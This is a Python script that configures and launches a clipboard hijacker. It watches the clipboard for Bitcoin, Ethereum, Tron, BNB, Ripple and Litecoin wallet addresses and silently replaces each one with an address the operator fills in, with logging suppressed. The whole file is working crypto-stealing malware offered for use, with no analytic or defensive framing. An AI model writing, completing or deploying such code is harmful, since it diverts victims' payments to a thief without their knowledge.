from clipboardjacker import ClipboardJacker, Config

# Define patterns for different cryptocurrency wallet addresses
patterns = [
    {
        "regex": r"bc1[ac-hj-np-z02-9]{11,71}|[13][a-km-zA-HJ-NP-Z1-9]{25,34}",
        "replace_with": "bc1qyourbitcoinaddresshere",
        "description": "Bitcoin (BTC) address",
        "priority": 1,
        "enabled": True
    },
    {
        "regex": r"0x[a-fA-F0-9]{40}",
        "replace_with": "0xyourethereumaddresshere",
        "description": "Ethereum (ETH) address",
        "priority": 1,
        "enabled": True
    },
    {
        "regex": r"T[1-9A-HJ-NP-Za-km-z]{33}",
        "replace_with": "Tyourtrxaddresshere",
        "description": "Tron (TRX) address",
        "priority": 1,
        "enabled": True
    },
    {
        "regex": r"bnb[0-9a-z]{38}",
        "replace_with": "bnyourbinanceaddresshere",
        "description": "Binance Chain (BNB) address",
        "priority": 1,
        "enabled": True
    },
    {
        "regex": r"r[0-9a-zA-Z]{24,34}",
        "replace_with": "ryourrippleaddresshere",
        "description": "Ripple (XRP) address",
        "priority": 1,
        "enabled": True
    },
    {
        "regex": r"L[0-9a-zA-Z]{33}",
        "replace_with": "Lyourlitecoinaddresshere",
        "description": "Litecoin (LTC) address",
        "priority": 1,
        "enabled": True
    }
]

# Create config
config = Config(
    patterns=patterns,
    rate_limit=1,  # 1 second between replacements
    log_level="ERROR",
    silent=True
)

# Initialize and run
jacker = ClipboardJacker(config)
jacker.monitor_clipboard()